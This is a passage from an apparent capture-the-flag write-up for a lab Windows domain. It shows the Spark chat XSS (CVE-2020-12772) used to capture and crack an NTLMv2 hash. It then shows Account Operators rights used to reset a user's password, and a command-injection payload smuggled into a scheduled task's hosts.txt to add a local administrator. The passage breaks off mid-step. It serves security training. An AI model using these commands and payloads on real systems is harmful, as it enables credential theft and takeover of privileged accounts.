+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+# A fatal error has been detected by the Java Runtime Environment:
+#
+#  SIGSEGV (0xb) at pc=0x00007f5ff70a50f8, pid=173, tid=0x00007f60576fe700
+#
+# JRE version: OpenJDK Runtime Environment (8.0_452-b09) (build 1.8.0_452-8u452-ga~us1-0ubuntu1~20.04-b09)
+# Java VM: OpenJDK 64-Bit Server VM (25.452-b09 mixed mode linux-amd64 compressed oops)
+# Problematic frame:
+# C  [jna4582059984314626988.tmp+0xd0f8]  Pa_GetDeviceInfo+0x58
+#
+# Core dump written. Default location: /usr/share/spark/core or core.173
+#
+# An error report file with more information is saved as:
+# /usr/share/spark/hs_err_pid173.log
+#
+# If you would like to submit a bug report, please visit:
+#   http://bugreport.java.com/bugreport/crash.jsp
+# The crash happened outside the Java Virtual Machine in native code.
+# See problematic frame for where to report the bug.
+#
+/usr/bin/spark: line 65:   173 Aborted                 (core dumped) java <span class="flag">-Dappdir</span>=${wd} ${javalibrarypath} <span class="flag">-cp</span> ${classpath} ${mainclass}
+root@9c4894cbd09a:~# 
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The application crashes immediately with a <code>SIGSEGV</code> error. The error log points to a native audio library (<code>Pa_GetDeviceInfo</code>), which indicates the application is failing because it can&rsquo;t find audio hardware in the headless Docker environment. To resolve this, I install ALSA (Advanced Linux Sound Architecture) utilities and create a dummy audio configuration file (<code>/etc/asound.conf</code>) that directs all audio to <code>null</code>.</p>
+<p>Inside the Docker container:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:white">root@9c4894cbd09a:~#</span> apt install <span class="flag">-y</span> alsa-utils libasound2 libasound2-plugins
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Then create a fake audio config:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:white">root@9c4894cbd09a:~#</span> echo 'pcm.!default {
+  type null
+}
+ctl.!default {
+  type null
+}' > /etc/asound.conf  
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>With the fake audio device in place, Spark finally launches</p>
+<img src="/img/RA/success.png" alt="" class="img-responsive" loading="lazy" />
+<h2 id="exploiting-xss-in-spark-t1059007">Exploiting XSS in Spark (T1059.007)<a hidden class="anchor" aria-hidden="true" href="#exploiting-xss-in-spark-t1059007">#</a></h2>
+<p>Now that the client is running, I need a target. The company website had a green highlighted next to the user &ldquo;Buse,&rdquo; indicating they were online</p>
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<img src="/img/RA/IT.png" alt="" class="img-responsive" loading="lazy" />
+<img src="/img/RA/bus.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>I search for known vulnerabilities in Spark 2.8.3 and find CVE-2020-12772, a Cross-Site Scripting (XSS) vulnerability</p>
+ <img src="/img/RA/research.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12772">https://nvd.nist.gov/vuln/detail/CVE-2020-12772</a></p>
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<p>I can send a message containing an <code>&lt;img&gt;</code> tag with a malicious <code>src</code> attribute pointing to my machine. When Buse views the message, the client will try to render the image, sending an SMB request to my machine</p>
+<p>I fire up <code>Responder</code> to catch the incoming connection and send the payload to Buse</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> responder <span class="flag">-I</span> tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="flag">-__</span>|__ <span class="flag">--</span>|  _  |  _  |     |  _  ||  <span class="flag">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.6.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+<span class="indicator-success">[+]</span> Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<img src="/img/RA/responder.png" alt="" class="img-responsive" loading="lazy" />
+<p>Success! <code>Responder</code> captures Buse&rsquo;s NTLMv2 hash. I crack it with <code>hashcat</code></p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">$</span> hashcat hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+...SNIP...
+BUSE::WINDCORP:07690831477c80d7:7c28dcfb5200f74a0958edcbc3669253:01010000000000000deff46b71efdb01c84bf6173a84765000000000020008004100310034004f0001001e00570049004e002d0046004d005700580047004f004c00590038004e004a00040014004100310034004f002e004c004f00430041004c0003003400570049004e002d0046004d005700580047004f004c00590038004e004a002e004100310034004f002e004c004f00430041004c00050014004100310034004f002e004c004f00430041004c000800300030000000000000000100000000200000036a7a0efc4d7a8afc3644d24276779fa48f3c7ada2736baeb0696e885e6c4630a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: BUSE::WINDCORP:07690831477c80d7:7c28dcfb5200f74a095...000000
+Time.Started.....: Mon Jul  7 15:01:34 2025 (0 secs)
+Time.Estimated...: Mon Jul  7 15:01:34 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 71929.7 kH/s (3.98ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3014656/14344385 (21.02%)
+Rejected.........: 0/3014656 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> tylerandariel
+Hardware.Mon.#1..: Temp: 36c Fan: 39% Util: 39% Core:1725MHz Mem:6800MHz Bus:16
+
+Started: Mon Jul  7 15:01:32 2025
+Stopped: Mon Jul  7 15:01:35 2025
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The password for <code>buse</code> is <code>uzunLM+3131</code></p>
+<hr>
+<h1 id="3-privilege-escalation-t1068">3. Privilege Escalation (T1068)<a hidden class="anchor" aria-hidden="true" href="#3-privilege-escalation-t1068">#</a></h1>
+<p>I first check if <code>buse</code> can WinRM</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> winrm $target <span class="flag">-u</span> buse <span class="flag">-p</span> <span class="string">'uzunLM+3131'</span>
+WINRM       10.10.96.189    5985   FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 (name:FIRE) (domain:windcorp.thm)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.96.189    5985   FIRE             <span class="indicator-success">[+]</span> windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> rdp $target <span class="flag">-u</span> buse <span class="flag">-p</span> <span class="string">'uzunLM+3131'</span>   
+RDP         10.10.96.189    3389   FIRE             <span class="indicator-info">[*]</span> Windows 10 or Windows Server 2016 Build 17763 (name:FIRE) (domain:windcorp.thm) (nla:True)
+RDP         10.10.96.189    3389   FIRE             <span class="indicator-success">[+]</span> windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Buse has WinRM and RDP access. We use Evil-WinRM for a shell</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> $target <span class="flag">-u</span> buse <span class="flag">-p</span> uzunLM+3131
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\Users\buse\Documents> cd ..
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\Users\buse> tree /f
+Folder PATH listing
+Volume serial number is 84E1-0562
+C:.
+³   .sparkExt.properties
+³   sip-communicator.properties
+³
+ÃÄÄÄ3D Objects
+ÃÄÄÄContacts
+ÃÄÄÄDesktop
+³   ³   Flag 2.txt
+³   ³   Notes.txt
+³   ³
+³   ÃÄÄÄAlso stuff
+³   ³       download.jpg
+³   ³       fun.jpg
+³   ³       maxresdefault.jpg
+³   ³
+³   ÀÄÄÄStuff
+³       ÀÄÄÄPasswords
+³               Facebook.txt
+³
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+³   ³   Bing.url
+³   ³
+³   ÀÄÄÄLinks
+ÃÄÄÄLinks
+³       Desktop.lnk
+³       Downloads.lnk
+³
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÃÄÄÄSearches
+ÀÄÄÄVideos
+
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\Users\buse\Desktop> type Flag*
+THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Flag 2: THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<p>Now for privilege escalation. I run <code>whoami /all</code> to check group memberships</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> whoami /all
+
+USER INFORMATION
+<span class="flag">----------------</span>
+
+User Name     SID
+============= ============================================
+windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
+
+
+GROUP INFORMATION
+<span class="flag">-----------------</span>
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+<span class="flag">----------------------</span>
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+<span class="flag">-----------------------</span>
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Buse is a member of <code>Account Operators</code>. This is a highly privileged group that can modify most user accounts (except for administrators).</p>
+<p>I find a script at <code>C:\scripts\checkservers.ps1</code> that is run by a scheduled task. The script reads a list of servers from <code>C:\Users\brittanycr\hosts.txt</code> and uses <code>Invoke-Expression</code> on the contents. This is a classic command injection vulnerability. If I can write to that file, I can execute code.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> type checkservers.ps1
+# reset the lists of hosts prior to looping
+$OutageHosts = $Null
+# specify the time you want email notifications resent for hosts that are down
+$EmailTimeOut = 30
+# specify the time you want to cycle through your host lists.
+$SleepTimeOut = 45
+# specify the maximum hosts that can be down before the script is aborted
+$MaxOutageCount = 10
+# specify who gets notified
+$notificationto = <span class="string">"brittanycr@windcorp.thm"</span>
+# specify where the notifications come from
+$notificationfrom = <span class="string">"admin@windcorp.thm"</span>
+# specify the SMTP server
+$smtpserver = <span class="string">"relay.windcorp.thm"</span>
+
+# start looping here
+Do{
+$available = $Null
+$notavailable = $Null
+Write-Host (Get-Date)
+
+# Read the File with the Hosts every cycle, this way to can add/remove hosts
+# from the list without touching the script/scheduled task,
+# also hash/comment (#) out any hosts that are going for maintenance or are down.
+get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ <span class="flag">-match</span> <span class="string">"#"</span>)} |
+ForEach-Object {
+    $p = <span class="string">"Test-Connection <span class="</span>flag">-ComputerName</span> $_ <span class="flag">-Count</span> 1 <span class="flag">-ea</span> silentlycontinue"
+    Invoke-Expression $p
+if($p)
+    {
+     # if the Host is available then just write it to the screen
+     write-host <span class="string">"Available host <span class="</span>flag">---</span>> <span class="string">"$_ <span class="</span>flag">-BackgroundColor</span> Green <span class="flag">-ForegroundColor</span> White
+     [Array]$available += $_
+    }
+else
+    {
+     # If the host is unavailable, give a warning to screen
+     write-host <span class="string">"Unavailable host <span class="</span>flag">------------</span>> <span class="string">"$_ <span class="</span>flag">-BackgroundColor</span> Magenta <span class="flag">-ForegroundColor</span> White
+     $p = Test-Connection <span class="flag">-ComputerName</span> $_ <span class="flag">-Count</span> 1 <span class="flag">-ea</span> silentlycontinue
+     if(!($p))
+       {
+        # If the host is still unavailable for 4 full pings, write error and send email
+        write-host <span class="string">"Unavailable host <span class="</span>flag">------------</span>> <span class="string">"$_ <span class="</span>flag">-BackgroundColor</span> Red <span class="flag">-ForegroundColor</span> White
+        [Array]$notavailable += $_
+
+        if ($OutageHosts <span class="flag">-ne</span> $Null)
+            {
+                if (!$OutageHosts.ContainsKey($_))
+                {
+                 # First time down add to the list and send email
+                 Write-Host <span class="string">"$_ Is not in the OutageHosts list, first time down"</span>
+                 $OutageHosts.Add($_,(get-date))
+                 $Now = Get-date
+                 $Body = <span class="string">"$_ has not responded for 5 pings at $Now"</span>
+                 Send-MailMessage <span class="flag">-Body</span> <span class="string">"$body"</span> <span class="flag">-to</span> $notificationto <span class="flag">-from</span> $notificationfrom `
+                  <span class="flag">-Subject</span> <span class="string">"Host $_ is down"</span> <span class="flag">-SmtpServer</span> $smtpserver
+                }
+                else
+                {
+                    # If the host is in the list do nothing for 1 hour and then remove from the list.
+                    Write-Host <span class="string">"$_ Is in the OutageHosts list"</span>
+                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes <span class="flag">-gt</span> $EmailTimeOut)
+                    {$OutageHosts.Remove($_)}
+                }
+            }
+        else
+            {
+                # First time down create the list and send email
+                Write-Host <span class="string">"Adding $_ to OutageHosts."</span>
+                $OutageHosts = @{$_=(get-date)}
+                $Body = <span class="string">"$_ has not responded for 5 pings at $Now"</span>
+                Send-MailMessage <span class="flag">-Body</span> <span class="string">"$body"</span> <span class="flag">-to</span> $notificationto <span class="flag">-from</span> $notificationfrom `
+                 <span class="flag">-Subject</span> <span class="string">"Host $_ is down"</span> <span class="flag">-SmtpServer</span> $smtpserver
+            }
+       }
+    }
+}
+# Report to screen the details
+$log = <span class="string">"Last run: $(Get-Date)"</span>
+write-host $log
+Set-Content <span class="flag">-Path</span> C:\scripts\log.txt <span class="flag">-Value</span> $log
+Write-Host <span class="string">"Available count:"</span>$available.count
+Write-Host <span class="string">"Not available count:"</span>$notavailable.count
+Write-Host <span class="string">"Not available hosts:"</span>
+$OutageHosts
+Write-Host <span class="string">""</span>
+Write-Host <span class="string">"Sleeping $SleepTimeOut seconds"</span>
+sleep $SleepTimeOut
+if ($OutageHosts.Count <span class="flag">-gt</span> $MaxOutageCount)
+{
+    # If there are more than a certain number of host down in an hour abort the script.
+    $Exit = $True
+    $body = $OutageHosts | Out-String
+    Send-MailMessage <span class="flag">-Body</span> <span class="string">"$body"</span> <span class="flag">-to</span> $notificationto <span class="flag">-from</span> $notificationfrom `
+     <span class="flag">-Subject</span> <span class="string">"More than $MaxOutageCount Hosts down, monitoring aborted"</span> <span class="flag">-SmtpServer</span> $smtpServer
+}
+}
+while ($Exit <span class="flag">-ne</span> $True)
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The problem is, I&rsquo;m <code>buse</code>, not <code>brittanycr</code>. But since I&rsquo;m an <code>Account Operator</code>, I can just reset <code>brittanycr</code>&rsquo;s password</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color: red">*Evil-WinRM*</span><span style="color: orange; font-weight: bold"> PS</span> C:\scripts> net user brittanycr Password123!
+The command completed successfully.
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I now have control of <code>brittanycr</code>&rsquo;s account. I first checked if I could get a WinRM shell as her, but access was denied:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> winrm $target <span class="flag">-u</span> brittanycr <span class="flag">-p</span> <span class="string">'Password123!'</span>
+WINRM       10.10.96.189    5985   FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 (name:FIRE) (domain:windcorp.thm)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.96.189    5985   FIRE             <span class="indicator-error">[-]</span> windcorp.thm\brittanycr:Password123!
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>However, I can access her user directory via the <code>Users</code> SMB share. My first thought was to inject a PowerShell reverse shell into <code>hosts.txt</code>. I uploaded the file and waited, but no shell came back, likely due to a firewall blocking the outbound connection.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">$</span> smbclient.py <span class="string">'windcorp.thm/brittanycr:Password123!'</span>@$target
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Shared
+SYSVOL
+Users
+# use Users
+# ls
+drw-rw-rw-          0  Sat May  2 18:05:58 2020 .
+drw-rw-rw-          0  Sat May  2 18:05:58 2020 ..
+drw-rw-rw-          0  Sun May 10 07:18:11 2020 Administrator
+drw-rw-rw-          0  Thu Apr 30 20:33:55 2020 All Users
+drw-rw-rw-          0  Fri May  1 09:09:44 2020 angrybird
+drw-rw-rw-          0  Fri May  1 09:09:34 2020 berg
+drw-rw-rw-          0  Fri May  1 09:09:22 2020 bluefrog579
+drw-rw-rw-          0  Sun May  3 09:30:02 2020 brittanycr
+drw-rw-rw-          0  Fri May  1 09:09:08 2020 brownostrich284
+drw-rw-rw-          0  Mon Jul  7 14:40:43 2025 buse
+drw-rw-rw-          0  Thu Apr 30 19:35:11 2020 Default
+drw-rw-rw-          0  Thu Apr 30 20:33:55 2020 Default User
+<span class="flag">-rw-rw-rw-</span>        174  Thu Apr 30 20:31:55 2020 desktop.ini
+drw-rw-rw-          0  Fri May  1 09:08:54 2020 edward
+drw-rw-rw-          0  Sat May  2 19:30:16 2020 freddy
+drw-rw-rw-          0  Fri May  1 09:08:28 2020 garys
+drw-rw-rw-          0  Mon Jul  7 15:16:05 2025 goldencat416
+drw-rw-rw-          0  Fri May  1 09:08:17 2020 goldenwol
+drw-rw-rw-          0  Fri May  1 09:08:06 2020 happ
+drw-rw-rw-          0  Fri May  1 09:07:53 2020 happyme
+drw-rw-rw-          0  Fri May  1 09:07:42 2020 Luis
+drw-rw-rw-          0  Fri May  1 09:07:31 2020 orga
+drw-rw-rw-          0  Fri May  1 09:07:19 2020 organicf
+drw-rw-rw-          0  Mon Jul  7 15:11:59 2025 organicfish718
+drw-rw-rw-          0  Fri May  1 09:07:06 2020 pete
+drw-rw-rw-          0  Thu Apr 30 10:35:47 2020 Public
+drw-rw-rw-          0  Fri May  1 09:06:54 2020 purplecat
+drw-rw-rw-          0  Fri May  1 09:06:42 2020 purplepanda
+drw-rw-rw-          0  Fri May  1 09:06:31 2020 sadswan
+drw-rw-rw-          0  Mon Jul  7 15:11:23 2025 sadswan869
+drw-rw-rw-          0  Fri May  1 09:06:20 2020 sheela
+drw-rw-rw-          0  Fri May  1 09:05:39 2020 silver
+drw-rw-rw-          0  Fri May  1 09:05:24 2020 smallf
+drw-rw-rw-          0  Fri May  1 09:05:05 2020 spiff
+drw-rw-rw-          0  Fri May  1 09:04:49 2020 tinygoos
+drw-rw-rw-          0  Fri May  1 09:03:57 2020 whiteleopard
+# cd brittanycr
+# ls
+drw-rw-rw-          0  Sun May  3 09:30:02 2020 .
+drw-rw-rw-          0  Sun May  3 09:30:02 2020 ..
+<span class="flag">-rw-rw-rw-</span>         22  Sun May  3 09:44:57 2020 hosts.txt
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The better approach is to use the command injection to create a new local user and add them to the Administrators group. I overwrite <code>hosts.txt</code> with the following payload:</p>
+<pre tabindex="0"><code>; net user pawned Password123! /add; net localgroup Administrators pawned /add
+</code></pre><p>I upload this file to <code>brittanycr</code>&rsquo;s directory via SMB:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+# cat hosts.txt
+google.com
+cisco.com
+
+
+# put hosts.txt
+# cat hosts.txt
+; net user pawned Password123! /add; net localgroup Administrators pawned /add
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I can watch <code>C:\scripts\log.txt</code> to see when the scheduled task runs:</p>
